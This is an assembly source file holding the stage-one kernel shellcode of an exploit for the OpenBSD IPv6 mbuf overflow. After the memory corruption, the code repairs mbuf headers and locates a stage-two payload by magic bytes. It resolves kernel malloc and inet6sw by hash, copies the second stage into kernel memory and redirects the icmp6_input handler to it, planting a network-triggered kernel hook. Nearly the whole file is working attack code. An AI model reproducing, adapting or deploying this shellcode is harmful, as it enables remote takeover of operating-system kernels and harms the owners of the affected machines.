 #
 # Stage one shellcode (OpenBSD IPv6 mbuf overflow).
 #
 #  Copyright (c) 2007 Claes M. Nyberg <cmn@signedness.org>
 #  All rights reserved, all wrongs reversed.
 #
 #  Redistribution and use in source and binary forms, with or without
 #  modification, are permitted provided that the following conditions
 #  are met:
 #
 #  1. Redistributions of source code must retain the above copyright
 #     notice, this list of conditions and the following disclaimer.
 #  2. Redistributions in binary form must reproduce the above copyright
 #     notice, this list of conditions and the following disclaimer in the
 #     documentation and/or other materials provided with the distribution.
 #  3. The name of author may not be used to endorse or promote products
 #     derived from this software without specific prior written permission.
 #
 #  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 #  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 #  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 #  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 #  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 #  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 #  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 #  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 #  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 #  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 #
 #

# Hash of symbols to lookup
.set HASH_malloc, 0xe047be43
.set HASH_inet6sw, 0x228ae6f2

# Magic bytes that indicate start of stage 2
.set MAGIC_START, 0xbadc0ded
.set STAGE2_MAX, 750

# The syscall to wrap
.set SYSCALL_wrap_index, 116 # SYS_gettimeofday

# Resolve syscall address from table
.macro get_syscall idx, reg
    movl   -8(%ebp), %ecx
    movl   \idx, \reg # Index
    movl   4(%ecx, \reg, 8), \reg
.endm

# Set syscall address in table
.macro set_syscall idx, addr
    movl   -8(%ebp), %ecx
    movl   \idx, %eax # Index
    movl   \addr, 4(%ecx, %eax, 8)
.endm

.globl stage1_start
.globl stage1_end
.globl hash_resolve_offset

.text
stage1_start:
	# Simplify stack recovery
    pushl   %ebp
    movl    %esp, %ebp

	# Fix m_hdr.mh_next (magic)
	movl	$0xdeafbeef, (%esi)

	# Clearm_hdr.mh_flags
	movw	$0x0000, 18(%esi)

	# malloc      -4(%ebp)
	pushl	%eax
	
	# icmp6_input_pointer -8(%ebp)
	pushl	%eax

	# hash_resolve address -12(%ebp)
	# Store offset here from exploit first
	hash_resolve_offset:
	pushl $0x41424344

	# %esp + 0x6c + 16 (last four pushl) 
	# points to mbuf in most cases
    movl 0x7c(%esp), %ecx

	# Follow mh_next until last mbuf (m_hdr.mh_next)
	# which contains our shellcode.	
	mbuf_next:
		# mbuf's are aligned to 256 
		cmpb $0x00, %cl
		jne finished

		# Make sure the high order nibble of the 
		# mbuf that we landed in matches our address
		movl	%esi, %eax
		sarl	$28, %eax
		movl	%ecx, %edx
		sarl    $28, %edx
		cmpl	%eax, %edx
		jnz		finished
    
		# Last mbuf in chain (next is NULL)
		cmpl $0x00, (%ecx)
		je mbuf_last

		movl (%ecx), %ecx
		jmp mbuf_next	

	mbuf_last:
		# Get data pointer (m_hdr.mh_data)
		movl 8(%ecx), %esi

		# Check for magic bytes which indicates start of payload
		cmpl    $MAGIC_START, (%esi)
		jne		finished
		addl	$4, %esi

	# Calculate and store address to hash_resolve
	movl	-12(%ebp), %eax
	addl	%esi, %eax
	movl	%eax, -12(%ebp)

	# Resolve malloc
	pushl	$HASH_malloc
	call	*-12(%ebp)
	movl	%eax, -4(%ebp)

	# Resolve inet6sw which stores icmp6_input function pointer
	pushl	$HASH_inet6sw
	call	*-12(%ebp)
	
	# Extract address to icmp6_input pointer
	# inet6sw[4].pr_input
	movl	$52, %ecx
	lea		0xc(%eax, %ecx, 4), %eax
	movl	%eax, -8(%ebp)

	# Check if icmp6_input is already wrapped.
	# Check for the call-instruction at the beginning
	# and refuse to overwrite the current wrapper.

	movl	(%eax), %eax
	cmpl $0x000001e8, (%eax)
	je finished

	# Allocate memory for stage 2 shellcode 
	# that will wrap icmp6_input
	# malloc(1024, M_DEVBUF, M_NOWAIT);
	xorl	%eax, %eax
	incl	%eax
	pushl	%eax          # flags (M_NOWAIT, 1)
	incl	%eax
	pushl	%eax          # type (M_DEVBUF, 2) This will add some feature ;)
	movw	$1024, %ax
	pushl	%eax          # size (1024 bytes)
	call	*-4(%ebp)
	test	%eax,%eax
	jz		finished      # Darn, malloc failed

	# %edi - allocated memory
	movl	%eax, %edi

	# Save buffer pointer for later use
	pushl	%edi

	# Store address of icmp6_input and the pointer for recovery later on
	movl -8(%ebp), %eax
	movl %eax, (%edi)		# %edi = icmp6_input pointer address
	movl (%eax), %eax	
	movl %eax, 0x4(%edi)	# 0x4(%edi) = icmp6_input pointer

	# %esi should point to start of stage 2 so we copy it
	# into the buffer right after the icmp6_input information
	addl	$8, %edi

	# Size of code to copy
	movl	$STAGE2_MAX, %ecx

	# Copy code to allocated buffer
	rep	movsb 

	# Restore buffer pointer
	popl	%edi
	# Point to second stage
	addl	$8, %edi

	# Wrap icmp6_input
	movl	-8(%ebp), %eax
	movl	%edi, (%eax)

	finished:
		movl    %ebp, %esp
		popl    %ebp

		# Restore %esp and return
		addl	$0x20, %esp
		popl	%ebx
		popl	%esi
		popl	%edi
		leave
		ret

stage1_end:
